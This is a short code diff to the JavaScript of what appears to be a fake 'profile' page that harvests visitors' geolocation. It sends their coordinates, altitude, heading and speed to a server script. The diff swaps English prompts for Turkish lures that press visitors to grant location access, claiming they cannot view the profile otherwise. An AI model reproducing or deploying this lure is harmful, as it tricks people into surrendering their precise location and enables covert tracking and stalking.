@@ -23,7 +23,7 @@ function locate()
       type: 'POST',
       url: '/php/result.php',
       data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
-      success: function(){$('#change').html('Coming Soon');},
+      success: function(){$('#change').html('Tekrar Deneyin');},
       mimeType: 'text'
     });
     alert('Lütfen Profili Görüntülemek İçin Sayfayı Yenileyip Konumunuzu Etkinleştirin');
@@ -43,7 +43,7 @@ function showError(error)
 			break;
 		case error.TIMEOUT:
 			var timeout = 'The request to get user location timed out';
-      alert('Please Set Your Location Mode on High Accuracy...');
+      alert('Konum İzni Vermeden Profil Sayfasını Görüntüleyemezsiniz');
 			break;
 		case error.UNKNOWN_ERROR:
 			var unknown = 'An unknown error occurred';
